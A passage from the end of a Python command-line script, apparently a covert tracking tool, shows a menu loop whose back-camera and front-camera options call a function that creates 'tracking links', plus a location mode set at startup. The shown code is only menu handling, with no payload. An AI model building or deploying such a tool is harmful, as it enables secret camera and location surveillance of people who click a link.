                if create_tracking_link('back_camera'):
                    try:
                        while True:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print("\n\033[1;33m⏹️  Stopped waiting...\033[0m")
                        continue
                    
            elif choice == '4':
                clear_screen()
                print_banner()
                print("\n\033[1;36m🤳 MODE: FRONT CAMERA\033[0m")
                if create_tracking_link('front_camera'):
                    try:
                        while True:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print("\n\033[1;33m⏹️  Stopped waiting...\033[0m")
                        continue
                    
            elif choice == '5':
                print("\n\033[1;33m👋 Goodbye!\033[0m")
                cleanup()
                sys.exit(0)
                
            else:
                print("\033[1;31m❌ Invalid option! Please try again.\033[0m")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\033[1;33m\n👋 Exiting...\033[0m")
            cleanup()
            sys.exit(0)
        except Exception as e:
            print(f"\033[1;31m❌ Error: {e}\033[0m")
            time.sleep(1)

if __name__ == '__main__':
    current_mode = 'cam_location'
    main()